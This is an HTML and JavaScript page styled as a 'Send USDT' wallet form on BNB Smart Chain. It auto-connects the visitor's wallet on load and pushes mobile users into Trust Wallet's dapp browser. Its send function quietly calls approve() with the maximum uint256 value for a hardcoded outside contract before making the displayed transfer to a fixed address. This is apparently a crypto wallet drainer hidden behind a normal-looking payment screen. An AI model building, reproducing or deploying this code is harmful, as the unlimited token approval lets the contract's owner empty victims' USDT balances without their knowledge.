<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <style>
    :root {
      --bg: #1a1a1a;
      --input-bg: #232323;
      --border: #333;
      --primary: #0b0;
      --mid: #585858;
      --btn: #18643e;
      --btn-active: #1d7f4a;
      --text: #fff;
      --text2: #acacac;
      --accent: #27ff85;
      --error: #ff284b;
      --usdt-max: #27ff85;
    }
    html, body {
      height: 100%;
      width: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .modal {
      background: var(--bg);
      border-radius: 22px;
      box-shadow: 0 5px 30px #000a;
      margin: 40px 0;
      padding: 32px 28px 20px 28px;
      width: 100%;
      max-width: 440px;
      box-sizing: border-box;
      position: relative;
      min-height: 600px;
    }
    .topbar {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 22px;
      position: relative;
    }
    .close-x {
      position: absolute;
      right: 0;
      cursor: pointer;
      color: var(--text2);
      font-size: 22px;
      margin-right: 0;
    }
    .modal h1 {
      font-size: 22px;
      font-weight: 600;
      margin: 0 auto 24px auto;
      text-align: center;
      letter-spacing: 0.01em;
    }
    .form-label {
      font-weight: 500;
      font-size: 15px;
      color: var(--text2);
      margin-bottom: 9px;
      margin-top: 15px;
      display: block;
    }
    .input-group {
      background: var(--input-bg);
      border: 1.5px solid var(--border);
      border-radius: 14px;
      display: flex;
      align-items: center;
      padding: 10px 17px;
      font-size: 16px;
      color: var(--text);
      margin-bottom: 17px;
      min-height: 44px;
    }
    .input-group .receiver {
      color: var(--text);
      font-size: 15px;
      flex: 1;
      user-select: all;
      background: transparent;
      border: none;
      outline: none;
      padding: 0;
    }
    .network-group {
      background: var(--input-bg);
      border: 1.5px solid var(--border);
      border-radius: 14px;
      display: flex;
      align-items: center;
      padding: 10px 17px;
      font-size: 16px;
      color: var(--text2);
      margin-bottom: 22px;
    }
    .network-icon {
      width: 28px;
      height: 28px;
      background: #f3ba2f;
      border-radius: 8px;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-right: 13px;
      flex-shrink: 0;
    }
    .network-icon img {
      width: 20px;
      height: 20px;
      display: block;
    }
    .network-label {
      color: var(--text);
      font-size: 16px;
      font-weight: 500;
    }
    .network-arrow {
      margin-left: 16px;
      color: var(--border);
      font-size: 13px;
    }
    .amount-group {
      background: var(--input-bg);
      border: 1.5px solid var(--border);
      border-radius: 14px;
      display: flex;
      align-items: center;
      padding: 10px 17px;
      font-size: 16px;
      color: var(--text);
      margin-bottom: 6px;
      min-height: 44px;
      justify-content: space-between;
      gap: 5px;
    }
    .usdt-input {
      background: transparent;
      border: none;
      color: var(--text);
      font-size: 16px;
      flex: 1;
      padding: 0;
      outline: none;
      min-width: 0;
    }
    .usdt-currency {
      color: var(--text2);
      font-size: 15px;
      margin-left: 8px;
      font-weight: 400;
    }
    .btn-max {
      color: var(--usdt-max);
      font-weight: 600;
      background: none;
      border: none;
      margin-left: 10px;
      font-size: 15px;
      cursor: pointer;
    }
    .usd-amount {
      text-align: left;
      color: var(--text2);
      font-size: 13.7px;
      margin-bottom: 32px;
      margin-left: 2px;
      min-height: 15px;
      letter-spacing: 0.01em;
    }
    #status {
      width: 100%;
      padding: 12px 0 3px 0;
      margin: 0 auto 10px auto;
      border-radius: 9px;
      font-weight: 500;
      font-size: 15px;
      text-align: center;
      display: none;
    }
    #status.success {
      display: block;
      background: #1d5a2a;
      color: #3effb8;
      border: 1px solid #165a3b;
    }
    #status.error {
      display: block;
      background: #421528;
      color: #ff7a7a;
      border: 1px solid #ff284b55;
    }
    .btn-next {
      width: 100%;
      padding: 18px 0 17px 0;
      background: var(--btn);
      border: none;
      border-radius: 28px;
      font-size: 18px;
      font-weight: 500;
      color: var(--text);
      letter-spacing: 0.01em;
      margin-top: 32px;
      margin-bottom: 7px;
      cursor: pointer;
      transition: background 0.18s, opacity 0.18s, box-shadow 0.15s;
      box-shadow: 0 4px 12px #1f331a22;
      position: absolute;
      left: 28px;
      right: 28px;
      bottom: 22px;
    }
    .btn-next[disabled] {
      opacity: 0.5;
      cursor: not-allowed;
      background: #2c3931;
    }
    .btn-connect {
      width: 100%;
      padding: 18px 0 17px 0;
      background: #333943;
      border: none;
      border-radius: 28px;
      font-size: 18px;
      font-weight: 500;
      color: var(--text2);
      margin-top: 32px;
      margin-bottom: 7px;
      cursor: pointer;
      position: absolute;
      left: 28px;
      right: 28px;
      bottom: 22px;
      display: none;
    }
    .show {
      display: block !important;
    }
  </style>
</head>
<body>
  <div class="modal">
    <div class="topbar">
      <span style="flex:1;"></span>
      <div class="close-x" onclick="closeModal()" title="Close">&times;</div>
    </div>
    <h1>Send USDT</h1>
    <label class="form-label">Address or Domain Name</label>
    <div class="input-group">
      <span class="receiver" readonly id="receiverAddr">
        0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
      </span>
    </div>
    <label class="form-label">Destination network</label>
    <div class="network-group">
      <div class="network-icon">
        <img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg?v=029" alt="BNB" />
      </div>
      <span class="network-label">BNB Smart Chain</span>
      <span class="network-arrow">&#9660;</span>
    </div>
    <label class="form-label">Amount</label>
    <div class="amount-group">
      <input type="number" id="amount" class="usdt-input" step="0.00000001" min="0" placeholder="USDT Amount" value="0"/>
      <span class="usdt-currency">USDT</span>
      <button class="btn-max" type="button" id="maxBtn" tabindex="0">Max</button>
    </div>
    <div class="usd-amount" id="usdAmount">
      ≈ $0.00
    </div>
    <div id="status"></div>
    <button class="btn-next" id="sendBtn" onclick="sendUSDT()" disabled>Next</button>
    <button class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
  </div>
<script>
  // === BSC/Wallet Dapp config ===
  const BSC_MAINNET = {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"]
  };
  const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
  const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
  const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
  const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];
  let web3;
  let userAccount;
  let usdtContract;
  let isConnected = false;
  let usdtBalance = "0.00";
  // --- UI Elements ---
  const statusDiv = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');
  const connectBtn = document.getElementById('connectBtn');
  const amountInput = document.getElementById('amount');
  const usdAmountDiv = document.getElementById('usdAmount');
  document.getElementById('receiverAddr').textContent = RECEIVER_ADDR;

  async function autoConnectBSC() {
    if (!window.ethereum) {
      // open Trust Wallet dapp browser if not in compatible wallet
      window.location.href =
        "https://link.trustwallet.com/open_url?url=" +
        encodeURIComponent(window.location.href);
      return;
    }
    try {
      // 1. Connect wallet (triggers popup)
      await window.ethereum.request({ method: "eth_requestAccounts" });
      web3 = new Web3(window.ethereum);
      // 2. Get primary address
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (!accounts || !accounts.length) throw new Error("No accounts");
      userAccount = accounts[0];
      // 3. Switch to BSC
      const chainId = await window.ethereum.request({ method: "eth_chainId" });
      if (chainId !== BSC_MAINNET.chainId) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_MAINNET.chainId }]
          });
        } catch (err) {
          if (err.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [BSC_MAINNET]
            });
          } else {
            throw err;
          }
        }
      }
      // 4. Ready/Init app
      isConnected = true;
      connectBtn.classList.remove('show');
      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
      await initContractsAndBalance();
      // Wallet event handlers
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', () => location.reload());
    } catch (err) {
      isConnected = false;
      connectBtn.classList.add('show');
      sendBtn.disabled = true;
      showStatus('Wallet not connected or rejected.', 'error');
      console.error('Connect/switch failed:', err);
    }
  }
  async function manualConnect() {
    connectBtn.classList.remove('show');
    await autoConnectBSC();
  }
  async function initContractsAndBalance() {
    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
    await updateBalance();
  }
  async function updateBalance() {
    try {
      const balance = await usdtContract.methods.balanceOf(userAccount).call();
      const balanceFormatted = web3.utils.fromWei(balance, "mwei");
      usdtBalance = parseFloat(balanceFormatted).toFixed(4);
    } catch (error) {
      console.error("Balance update failed:", error);
      usdtBalance = "0.00";
    }
  }
  function handleAccountsChanged(accounts) {
    if (!accounts.length) {
      isConnected = false;
      connectBtn.classList.add('show');
      sendBtn.disabled = true;
    } else {
      userAccount = accounts[0];
      isConnected = true;
      connectBtn.classList.remove('show');
      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
      initContractsAndBalance();
    }
  }
  async function sendUSDT() {
    const amount = parseFloat(amountInput.value) || 0;
    sendBtn.disabled = true;
    sendBtn.textContent = "Processing...";
    showStatus("", "");
    try {
      await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
        from: userAccount
      });
      const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
      await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
        from: userAccount
      });
      showStatus("✅ Complete!", "success");
      amountInput.value = "0";
      await updateBalance();
    } catch (e) {
      showStatus("Transaction Failed", "error");
      console.error("Send Failed:", e);
    } finally {
      sendBtn.disabled = false;
      sendBtn.textContent = "Next";
    }
  }
  function showStatus(message, type) {
    statusDiv.innerHTML = message;
    if (!type) statusDiv.style.display = "none";
    else {
      statusDiv.style.display = "block";
      statusDiv.className = "";
      if (type === "success") statusDiv.classList.add("success");
      if (type === "error") statusDiv.classList.add("error");
    }
  }
  function closeModal() {
    alert("Modal closed! (replace with real close logic)");
  }
  document.getElementById("maxBtn").onclick = function () {
    amountInput.value = usdtBalance || "0.00";
    updateUSD();
  };
  amountInput.oninput = updateUSD;

  function updateUSD() {
    let val = parseFloat(amountInput.value) || 0;
    usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
    sendBtn.disabled = !(val > 0 && isConnected);
  }
  sendBtn.disabled = true;
  // Robust auto-connect: all events & fallback for mobile dapps:
  window.addEventListener("load", autoConnectBSC, false);
  window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
  setTimeout(autoConnectBSC, 600);
  if (
    window.location.hash.includes("send") ||
    window.location.search.includes("send")
  ) {
    setTimeout(autoConnectBSC, 200);
  }
</script>
</body>
</html>
